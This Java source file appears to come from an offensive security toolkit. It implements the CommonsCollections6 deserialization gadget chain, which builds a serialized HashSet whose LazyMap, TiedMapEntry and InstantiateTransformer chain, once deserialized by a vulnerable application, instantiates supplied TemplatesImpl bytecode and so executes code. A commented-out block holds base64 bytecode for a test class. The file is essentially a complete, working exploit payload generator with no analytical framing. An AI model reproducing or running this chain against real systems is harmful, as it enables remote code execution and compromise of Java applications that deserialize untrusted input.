package com.droplab.Utils.UnSerialize.Gadget;

import com.droplab.Utils.UnSerialize.Gadget.Interface.GadgetInterface;
import com.droplab.Utils.UnSerialize.utils.Gadgets;
import com.droplab.Utils.UnSerialize.utils.Reflections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6 implements GadgetInterface {
    @Override
    public byte[] getObject(final Object o) {
        try {
           /* String str="yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAG" +
                    "AcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3h" +
                    "zbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZ" +
                    "XJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb" +
                    "25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb" +
                    "20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW" +
                    "4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsp" +
                    "VgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAP" +
                    "BwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb" +
                    "20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA" +
                    "5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2Y" +
                    "S9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0" +
                    "BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAA" +
                    "AAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAA" +
                    "CgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAO" +
                    "AAwADwABABAAAAACABE=";
            byte[] decode = Base64.getDecoder().decode(str);
            TemplatesImpl templates = new TemplatesImpl();
            Reflections.setFieldValue(templates,"_name","HelloTemplatesImpl");
            Reflections.setFieldValue(templates,"_bytecodes",new byte[][]{decode});
            Reflections.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());*/
            InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{o});
            final Map innerMap = new HashMap();

            final Map lazyMap = LazyMap.decorate(innerMap, instantiateTransformer);

            TiedMapEntry entry = new TiedMapEntry(lazyMap, TrAXFilter.class);

            HashSet map = new HashSet(1);
            map.add("foo");
            Field f = null;
            try {
                f = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException e) {
                f = HashSet.class.getDeclaredField("backingMap");
            }

            Reflections.setAccessible(f);
            HashMap innimpl = (HashMap) f.get(map);
            Field f2 = null;
            try {
                f2 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException e) {
                f2 = HashMap.class.getDeclaredField("elementData");
            }

            Reflections.setAccessible(f2);
            Object[] array = (Object[]) f2.get(innimpl);

            Object node = array[0];
            if(node == null){
                node = array[1];
            }

            Field keyField = null;
            try{
                keyField = node.getClass().getDeclaredField("key");
            }catch(Exception e){
                keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
            }
            Reflections.setAccessible(keyField);
            keyField.set(node, entry);

            return Gadgets.SerializeObject(map);
        }catch (Exception e){
            e.printStackTrace();
        }
        return new byte[0];
    }
}
